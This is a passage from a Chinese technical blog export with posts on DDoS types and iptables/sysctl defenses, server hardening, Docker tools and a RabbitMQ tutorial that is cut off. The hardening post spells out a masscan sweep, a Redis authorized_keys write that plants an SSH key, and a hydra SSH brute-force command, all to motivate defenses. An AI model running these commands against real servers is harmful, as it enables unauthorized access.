攻击是当前网络上最为常见的DDoS攻击，它利用了TCP协议实现上的一个缺陷。通过向网络服务所在端口发送大量的伪造源地址的攻击报文，就可能造成目标服务器中的半开连接队列被占满，从而阻止其他合法用户进行访问。</p></blockquote><p>众所周知,TCP要建立连接，需要进行三次握手，通信的双方最少得经过3次成功的信息交换才能进入连接全开状态(Full-Open)。一个正常的连接建立需要如下步骤：</p><ol><li>首先，客户端向服务器发送SYN数据包，以便启动连接；</li><li>服务器响应该初始包与SYN / ACK包，以确认通信；</li><li>最后，客户端返回ACK数据包以确认从服务器接收到的数据包。完成这个数据包发送和接收序列后，TCP连接打开并能发送和接收数据。</li></ol><p>攻击者利用TCP握手这一机制，在接收到初始SYN数据包之后，服务器将用一个或多个SYN / ACK数据包进行响应，并等待握手中的最后一步。这是它的工作原理：</p><ol><li>攻击者向目标服务器发送大量SYN数据包，通常会使用欺骗性的IP地址。</li><li>服务器响应每个连接请求，并留下开放端口准备好接收响应。</li><li>服务器等待从未到达的最终ACK数据包时，攻击者继续发送更多的SYN数据包。每个新的SYN数据包的到达导致服务器暂时维持新的开放端口连接一段时间，一旦所有可用端口被使用，服务器就无法正常工作。</li></ol><p>当服务器断开连接但连接另一端的机器没有连接时，连接被认为是半开的。在这种类型的DDoS攻击中，目标服务器不断离开打开的连接，等待每个连接超时，然后端口再次可用。结果是这种攻击可以被认为是“半开攻击”。</p><h3 id="UDP-Flood攻击"><a href="#UDP-Flood攻击" class="headerlink" title="UDP Flood攻击"></a>UDP Flood攻击</h3><p>UDP Flood 是日渐猖厥的流量型DDoS攻击，原理也很简单。常见的情况是利用大量UDP小包冲击DNS服务器或Radius认证服务器、流媒体视频服务器。由于UDP协议是一种无连接的服务，在UDP Flood攻击中，攻击者可发送大量伪造源IP地址的小UDP包。</p><h3 id="ICMP-Flood攻击"><a href="#ICMP-Flood攻击" class="headerlink" title="ICMP Flood攻击"></a>ICMP Flood攻击</h3><p>ICMP Flood攻击属于流量型的攻击方式，是利用大的流量给服务器带来较大的负载，影响服务器的正常服务。由于目前很多防火墙直接过滤ICMP报文。因此ICMP Flood出现的频度较低。</p><h3 id="Connection-Flood攻击"><a href="#Connection-Flood攻击" class="headerlink" title="Connection Flood攻击"></a>Connection Flood攻击</h3><p>Connection Flood是典型的利用小流量冲击大带宽网络服务的攻击方式，这种攻击的原理是利用真实的IP地址向服务器发起大量的连接。并且建立连接之后很长时间不释放，占用服务器的资源，造成服务器上残余连接(WAIT状态)过多，效率降低，甚至资源耗尽，无法响应其他客户所发起的链接。</p><h3 id="HTTP-Get攻击"><a href="#HTTP-Get攻击" class="headerlink" title="HTTP Get攻击"></a>HTTP Get攻击</h3><p>这种攻击主要是针对存在ASP、JSP、PHP、CGI等脚本程序，特征是和服务器建立正常的TCP连接，并不断的向脚本程序提交查询、列表等大量耗费数据库资源的调用。这种攻击的特点是可以绕过普通的防火墙防护，可通过Proxy代理实施攻击，缺点是攻击静态页面的网站效果不佳，会暴露攻击者的lP地址。</p><h3 id="UDP-DNS-Query-Flood攻击"><a href="#UDP-DNS-Query-Flood攻击" class="headerlink" title="UDP DNS Query Flood攻击"></a>UDP DNS Query Flood攻击</h3><p>UDP DNS Query Flood攻击采用的方法是向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名。域名解析的过程给服务器带来了很大的负载，每秒钟域名解析请求超过一定的数星就会造成DNS服务器解析域名超时。</p><h2 id="DDOS-的防范"><a href="#DDOS-的防范" class="headerlink" title="DDOS 的防范"></a>DDOS 的防范</h2><h3 id="通过-Linux-自带防火墙防范攻击"><a href="#通过-Linux-自带防火墙防范攻击" class="headerlink" title="通过 Linux 自带防火墙防范攻击"></a>通过 Linux 自带防火墙防范攻击</h3><p>以 DDOS SYN Flood 攻击为例，我们可以通过系统自带的iptables 防火墙来进行防护。<br>第一种方式是禁止攻击来源IP，但是通常攻击源都不只一个IP，这种方式防护比较弱。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ iptables -I INPUT -s 192.168.0.2 -p tcp -j REJECT</span><br></pre></td></tr></table></figure><p>第二钟方式是 限制syn并发的次数以及同一个IP 新建连接数的数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 限制 syn 并发数为每秒 1 次</span><br><span class="line">$ iptables -A INPUT -p tcp --syn -m limit --limit 1&#x2F;s -j ACCEPT</span><br><span class="line"># 限制单个 IP 在 60 秒新建立的连接数为 10</span><br><span class="line">$ iptables -I INPUT -p tcp --dport 80 --syn -m recent --name SYN_FLOOD --update --seconds 60 --hitcount 10 -j REJECT</span><br></pre></td></tr></table></figure><p>但是如果攻击源特别多，其实还是很难阻挡。SYN Flood 会导致 SYN_RECV 状态的连接急剧增大，可以通过调整半连接容量大小，例如调整为 1024</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sysctl -w net.ipv4.tcp_max_syn_backlog&#x3D;1024</span><br><span class="line">net.ipv4.tcp_max_syn_backlog &#x3D; 1024</span><br></pre></td></tr></table></figure><p>另外，每个SYN_RECV 如果失败，内核还会自动重试，默认是 5次，可以修改为1次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sysctl -w net.ipv4.tcp_synack_retries&#x3D;1</span><br><span class="line">net.ipv4.tcp_synack_retries &#x3D; 1</span><br></pre></td></tr></table></figure><p>此外，TCP SYN Cookies 是一种专门防御 SYN Flood 攻击的方法，其原理是基于连接信息(包括源地址、源端口、目的地址、目的端口等）以及一个加密种子（如系统启动时间），计算出一个哈希值（SHA1），这个哈希值称为 cookie。</p><p>这个 cookie 就被用作序列号，来应答 SYN+ACK 包，并释放连接状态。当客户端发送完三次握手的最后一次 ACK 后，服务器就会再次计算这个哈希值，确认是上次返回的 SYN+ACK 的返回包，才会进入 TCP 的连接状态。因而，开启 SYN Cookies 后，就不需要维护半开连接状态了，进而也就没有了半连接数的限制。</p><p>注意开启 TCP syncookies 后，内核选项 net.ipv4.tcp_max_syn_backlog 也就无效了。可以通过下面的方式开启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sysctl -w net.ipv4.tcp_syncookies&#x3D;1</span><br><span class="line">net.ipv4.tcp_syncookies &#x3D; 1</span><br></pre></td></tr></table></figure><h3 id="优化网络相关的内核参数"><a href="#优化网络相关的内核参数" class="headerlink" title="优化网络相关的内核参数"></a>优化网络相关的内核参数</h3><p>当遭遇攻击时，请求数会较大，你可能会看到大量处于TIME. WAIT状态的连接。<br>linux查看tcp的状态命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant查看TCP各个状态的数量；</span><br><span class="line">lsof -i:port 可以检测到打开套接字的状况；</span><br><span class="line">sar -n SOCK 查看tcp创建的连接数；</span><br><span class="line">tcpdump -iany tcp port 6000 对tcp端口为6000的进行抓包。</span><br></pre></td></tr></table></figure><p><img src="DDOS_TCP%E7%8A%B6%E6%80%81.png" alt=""></p><p>它们会占用大量内存和端口资源。这时，我们可以优化与TIME_ WAIT状态相关的内核选项，比如采取下面几种措施：</p><ul><li>增大处于 TIME_WAIT 状态的连接数量 net.ipv4.tcp_max_tw_buckets ，并增大连接跟踪表的大小 net.netfilter.nf_conntrack_max。</li><li>减小 net.ipv4.tcp_fin_timeout 和 net.netfilter.nf_conntrack_tcp_timeout_time_wait ，让系统尽快释放它们所占用的资源。</li><li>开启端口复用 net.ipv4.tcp_tw_reuse。这样，被 TIME_WAIT 状态占用的端口，还能用到新建的连接中。</li><li>增大本地端口的范围 net.ipv4.ip_local_port_range。这样就可以支持更多连接，提高整体的并发能力。</li><li>增加最大文件描述符的数量。你可以使用fs.nr_open 和 fs.file-max ，分别增大进程和系统的最大文件描述符数；或在应用程序的 systemd 配置文件中，配置 LimitNOFILE ，设置应用程序的最大文件描述符数。</li></ul><h3 id="通过专业的流量清洗系统来防范DDOS攻击"><a href="#通过专业的流量清洗系统来防范DDOS攻击" class="headerlink" title="通过专业的流量清洗系统来防范DDOS攻击"></a>通过专业的流量清洗系统来防范DDOS攻击</h3><p>流量清洗服务是一种针对对其发起的DOS/DDOS攻击的监控、告警和防护的一种网络安全服务。在不影响正常业务的前提下，清洗掉异常流量。它会分析和过滤异常流量，将异常的攻击流量阻挡在门外，从而为正常的请求提供服务。<br>一般这类系统由专门的服务商提供，大多数会提供10 Gpbs~100Gpbs 的防护能力。<br>可以见《网络安全服务提供商.md》</p>]]></content>
      
      
      <categories>
          
          <category> Internet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> DDOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Secure The Server</title>
      <link href="/2020/01/03/Secure-The-Server/"/>
      <url>/2020/01/03/Secure-The-Server/</url>
      
        <content type="html"><![CDATA[<h2 id="修改远程连接端口"><a href="#修改远程连接端口" class="headerlink" title="修改远程连接端口"></a>修改远程连接端口</h2><p>例如 windows 的 3389，Linux 的 22 端口。应用服务尽量不要对公网开放，尤其是中间件服务，除了 web 服务所提供的 80，443 端口之外都应该尽量不要对公网开放默认端口，例如 MySQL 的 3306 ，Redis 的 6379 等等。</p><p>因为互联网上大量的入侵都是首先扫描到开放这些默认端口的机器，然后在探测是否存在已知的漏洞进而发起攻击。</p><p>举个例子，假如入侵者想入侵 redis 3.0 以下版本的 redis，攻击者可以通过 nmap 或 masscan 这类扫描攻击扫描某一个 IP 段是否开放以及根据你的服务器特征探测你的服务器是 Linux 还是 Windows来选择以何种方式发起攻击，以 masscan 为例，探测49.111.0.0/16网段内是否有 redis 服务开启默认 6379 端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p6379 49.111.0.0&#x2F;16 --rate 10000 &gt;&gt; scan.txt</span><br></pre></td></tr></table></figure><p>然后获取到该网段开放了 6379 端口的 IP，并进行下一步判断其是否有设置密码，版本是否是 3.0 以下。执行如下命令即可查看这台 redis 的相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;redis-cli -h IP info</span><br></pre></td></tr></table></figure><p>然后判断是否设置了密码,如果没有设置密码，通过 redis 的持久化机制将入侵者的公钥写入到/.ssh 目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">OK</span><br><span class="line">&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">&gt; set xxx &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWuati70x2tsLBJ6FxDgK5NnRhUiIYMHEL9Nt0cwtOvlc8it7Ta9uSzQX6RV3hpF0Txg8&#x2F;ARZaq75JyzN+1jsNh35mR49YWJloU8FbiI28IjdKAVvCOcAd&#x2F;WWsPWrRIJPG38Z8Bu2xXBsNCmMwOtPd6VL4k9j6xmeA52PLe4wBJHZbGkPrbTxd7TTtvuWWmbx0dzvXBYCIalhVOJ7u5471tMBoCFGCYh5V8lzS0c4Hm3tf5SuQ8G3vWP8fLE6iUGen9rqBu+QNSxlYJSwz+O5T&#x2F;ErFTFPZI3USQM7th1r6iY&#x2F;Z8O7AzZlhXzPCHKcd&#x2F;+8mzcEJ1JFU8m9gXgF6JwER ubuntu@ubuntu-xenial\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure><h2 id="遭受攻击后采取措施"><a href="#遭受攻击后采取措施" class="headerlink" title="遭受攻击后采取措施"></a>遭受攻击后采取措施</h2><p>养成定期更新你的系统和应用软件，因为旧版本软件大多都会存在漏洞被攻击者利用。<br>尽量不要以管理员权限运行一些应用程序，要以一个普通用户运行指定程序，防止被提权。<br>禁止密码登录，改为更安全的密钥登录。密钥采用rsa非对称加密算法，并设置大于 2048 位以上密钥，安全系数更高。因为如果采用密码登录，入侵者只要密码字典足够强大，机器运算能力够强是可以非常轻松的破解的，例如通过 hydra 来暴力破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -s 22 -v -l root -P pass.txt 49.111.95.153 ssh</span><br></pre></td></tr></table></figure><p>以 Linux 为例，修改/etc/ssh/sshd_config 中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 不允许任何人作为根用户登录</span><br><span class="line">PermitRootLogin yes 为 no</span><br><span class="line"># 允许一次登录花费 30 秒；如果超过 30 秒，就不允许访问，必须重新登录。</span><br><span class="line">LoginGraceTime 30</span><br><span class="line"></span><br><span class="line">PasswordAuthentication yes 为 no</span><br><span class="line"># 限制最大重试次数为 3 次，3 次之后拒绝登录尝试。</span><br><span class="line">MaxAuthTries 3</span><br><span class="line"># 禁止使用比较弱的协议。</span><br><span class="line">Protocol 2</span><br></pre></td></tr></table></figure><h2 id="最小化对外暴露端口"><a href="#最小化对外暴露端口" class="headerlink" title="最小化对外暴露端口"></a>最小化对外暴露端口</h2><p>除非有必要，千万不要将所有端口都设置端口放行为 0.0.0.0/0 这样的规则。<br>除了 80、443 这样的必须要对外开放访问权限的端口，其他服务都在相对安全的内网环境中运行，这样的优势是除了提升了安全性还防止跨链路带来的带宽损耗，提升访问速度。例如web 服务调用后端 MySQL，如果通过公网访问，速度肯定不及同一个局域网内互相访问的快。</p><h2 id="在使用-HTTPS-时尽量使用-TLS1-2-版本的协议，并使用加密性非常好的算法。"><a href="#在使用-HTTPS-时尽量使用-TLS1-2-版本的协议，并使用加密性非常好的算法。" class="headerlink" title="在使用 HTTPS 时尽量使用 TLS1.2+版本的协议，并使用加密性非常好的算法。"></a>在使用 HTTPS 时尽量使用 TLS1.2+版本的协议，并使用加密性非常好的算法。</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+ECDSA+AES128:EECDH+aRSA+AES128:RSA+AES128:EECDH+ECDSA+AES256:EECDH+aRSA+AES256:RSA+AES256:EECDH+ECDSA+3DES:EECDH+aRSA+3DES:RSA+3DES:TLS-CHACHA20-POLY1305-SHA256:TLS-AES-256-GCM-SHA384:TLS-AES-128-GCM-SHA256:EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!KRB5:!aECDH:!EDH+3DES;</span><br></pre></td></tr></table></figure><h2 id="如果遭受-DDOS-攻击，可以考虑购买一些防护服务来解决，避免业务受损。"><a href="#如果遭受-DDOS-攻击，可以考虑购买一些防护服务来解决，避免业务受损。" class="headerlink" title="如果遭受 DDOS 攻击，可以考虑购买一些防护服务来解决，避免业务受损。"></a>如果遭受 DDOS 攻击，可以考虑购买一些防护服务来解决，避免业务受损。</h2><p>常见的有 <a href="https://www.cloudflare.com/" target="_blank" rel="noopener">cloudflare</a></p>]]></content>
      
      
      <categories>
          
          <category> Internet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker Tools</title>
      <link href="/2019/12/03/Docker-Tools/"/>
      <url>/2019/12/03/Docker-Tools/</url>
      
        <content type="html"><![CDATA[<h4 id="watchtower：自动更新-Docker-容器"><a href="#watchtower：自动更新-Docker-容器" class="headerlink" title="watchtower：自动更新 Docker 容器"></a>watchtower：自动更新 Docker 容器</h4><blockquote><p><a href="https://github.com/v2tec/watchtower" target="_blank" rel="noopener">https://github.com/v2tec/watchtower</a></p></blockquote><p>Watchtower 监视运行容器并监视这些容器最初启动时的镜像有没有变动。当 Watchtower 检测到一个镜像已经有变动时，它会使用新镜像自动重新启动相应的容器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Watchtower 本身被打包为 Docker 镜像，因此可以像运行任何其他容器一样运行它。</span><br><span class="line">docker run -d --name watchtower --rm -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock  v2tec&#x2F;watchtower --interval 30</span><br></pre></td></tr></table></figure><p>使用挂载文件 /var/run/docker.sock 启动 Watchtower 容器。这么做是为了使 Watchtower 可以与 Docker 守护 API 进行交互。我们将 30 秒传递给间隔选项 interval。此选项定义了 Watchtower 的轮询间隔。<br>比如现在启动一个 Watchtower 可以监视的容器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -p 4000:80 --name friendlyhello shekhargulati&#x2F;friendlyhello:latest</span><br></pre></td></tr></table></figure><p>现在，Watchtower 将开始温和地监控这个 friendlyhello 容器。当我将新镜像推送到 Docker Hub 时，Watchtower 在接下来的运行中将检测到一个新的可用的镜像。它将优雅地停止那个容器并使用这个新镜像启动容器。它将传递我们之前传递给这条 run 命令的选项。换句话说，该容器将仍然使用 4000:80 发布端口来启动。</p><p>默认情况下，Watchtower 将轮询 Docker Hub 注册表以查找更新的镜像。通过传递环境变量 REPO_USER 和 REPO_PASS 中的注册表凭据，可以将 Watchtower 配置为轮询私有注册表。</p><h4 id="docker-slim：面向容器的神奇减肥药"><a href="#docker-slim：面向容器的神奇减肥药" class="headerlink" title="docker-slim：面向容器的神奇减肥药"></a>docker-slim：面向容器的神奇减肥药</h4><blockquote><p><a href="https://github.com/docker-slim/docker-slim" target="_blank" rel="noopener">https://github.com/docker-slim/docker-slim</a></p></blockquote><p>docker-slim 工具使用静态和动态分析方法来为你臃肿的镜像瘦身。要使用 docker-slim，可以从 Github 下载 Linux 或者 Mac 的二进制安装包。成功下载之后，将它加入到你的系统变量 PATH 中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-slim build --http-probe friendlyhello</span><br></pre></td></tr></table></figure><h4 id="ctop：容器的类顶层接口"><a href="#ctop：容器的类顶层接口" class="headerlink" title="ctop：容器的类顶层接口"></a>ctop：容器的类顶层接口</h4><blockquote><p><a href="https://github.com/bcicen/ctop" target="_blank" rel="noopener">https://github.com/bcicen/ctop</a></p></blockquote><p>ctop 能够提供多个容器的实时指标视图。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># mac 安装</span><br><span class="line">$ brew install ctop</span><br></pre></td></tr></table></figure><p>一旦完成安装，就可以开始使用 ctop 了。现在，你只需要配置 DOCKER_HOST 环境变量。<br>你可以运行 ctop 命令，查看所有容器的状态。<br>若只想查看正在运行的容器，可以使用 ctop -a 命令。</p>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Message Queue ——RabbitMQ</title>
      <link href="/2019/11/11/Message-Queue-%E2%80%94%E2%80%94RabbitMQ/"/>
      <url>/2019/11/11/Message-Queue-%E2%80%94%E2%80%94RabbitMQ/</url>
      
        <content type="html"><![CDATA[<h2 id="消息中间件"><a href="#消息中间件" class="headerlink" title="消息中间件"></a>消息中间件</h2><p>消息中间件有很多种，如 activemq, rabbitmq 等等。</p><h2 id="RabbitMQ-模式概述"><a href="#RabbitMQ-模式概述" class="headerlink" title="RabbitMQ 模式概述"></a>RabbitMQ 模式概述</h2><blockquote><p> rabbitmq 使用的是一种叫做 AMQP 的协议来通信。 AMQP 是 advanced Message Queuing Protocol 的缩写。简单地说，通过这种协议，可以处理更为复杂的业务需求。</p></blockquote><p>基于 AMQP 这种协议，可以实现如下各种模式。</p><h3 id="消息路由过程"><a href="#消息路由过程" class="headerlink" title="消息路由过程"></a>消息路由过程</h3><p>与 ActiveMQ 拿到消息就直接放在队列等待消费者拿走不同， Rabbit 拿到消息之后，会先交给 交换机 （Exchange）, 然后交换机再根据预先设定的不同绑定( Bindings )策略，来确定要发给哪个队列。<br>如图所示，比起 ActiveMQ 多了 Exchange 和 Bindings。<br>正是由于有了    Exchange 和 Bindings， RabbitMQ 就可以灵活地支撑各种模式。<br><img src="RabbitMQ_3.png" alt=""><br>RabbitMQ提供了四种Exchange模式：fanout,direct,topic,header 。 header模式在实际使用中较少，一般不作考虑。</p><h4 id="Fanout-模式"><a href="#Fanout-模式" class="headerlink" title="Fanout 模式"></a>Fanout 模式</h4><p>fanout 模式就是广播模式。消息来了，会发给所有的队列。<br><img src="RabbitMQ_4.png" alt=""></p><h4 id="Direct-模式"><a href="#Direct-模式" class="headerlink" title="Direct 模式"></a>Direct 模式</h4><p>Direct 模式就是指定队列模式，消息来了，只发给指定的 Queue, 其他Queue 都收不到。<br><img src="RabbitMQ_5.png" alt=""></p><h4 id="Topic-模式"><a href="#Topic-模式" class="headerlink" title="Topic 模式"></a>Topic 模式</h4><p>主题模式，注意这里的主题模式，和 ActivityMQ 里的不一样。 ActivityMQ 里的主题，更像是广播模式。<br>那么这里的主题模式是什么意思呢？ 如图所示消息来源有： 美国新闻，美国天气，欧洲新闻，欧洲天气。<br>如果你想看 <font color="#FFFF66">美国</font>主题： 那么就会收到 <font color="#FFFF66">美国</font>新闻，<font color="#FFFF66">美国</font>天气。<br>如果你想看 <font color="#FFFF66">新闻</font>主题： 那么就会收到 <font color="#FFFF66">美国</font>新闻，<font color="#FFFF66">欧洲</font>新闻。<br>如果你想看 <font color="#FFFF66">天气</font>主题： 那么就会收到 <font color="#FFFF66">美国</font>天气，<font color="#FFFF66">欧洲</font>天气。<br>如果你想看 <font color="#FFFF66">欧洲</font>主题： 那么就会收到 <font color="#FFFF66">欧洲</font>新闻，<font color="#FFFF66">欧洲</font>天气。<br><img src="RabbitMQ_6.png" alt=""></p><h3 id="Fanout模式"><a href="#Fanout模式" class="headerlink" title="Fanout模式"></a>Fanout模式</h3><h4 id="pom-中加入依赖"><a href="#pom-中加入依赖" class="headerlink" title="pom 中加入依赖"></a>pom 中加入依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rabbitmq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>amqp-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.6.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="判断服务是否启动类"><a href="#判断服务是否启动类" class="headerlink" title="判断服务是否启动类"></a>判断服务是否启动类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.how2j.testrabbitmq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.JOptionPane;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.NetUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RabbitMQUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        checkServer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkServer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(NetUtil.isUsableLocalPort(<span class="number">15672</span>)) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>, <span class="string">"RabbitMQ 服务器未启动 "</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line"> System.out.println(<span class="string">"服务器已启动"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="接收消息Customer"><a href="#接收消息Customer" class="headerlink" title="接收消息Customer"></a>接收消息Customer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.how2j.testrabbitmq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.AMQP;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Channel;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Connection;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Consumer;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.DefaultConsumer;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Envelope;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.RandomUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FanoutCustomer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String EXCHANGE_NAME=<span class="string">"fanout_exchange"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        <span class="comment">//为当前消费者取随机名</span></span><br><span class="line">        String name = <span class="string">"consumer-"</span>+ RandomUtil.randomString(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断服务器是否启动</span></span><br><span class="line">        RabbitMQUtil.checkServer();</span><br><span class="line">        <span class="comment">// 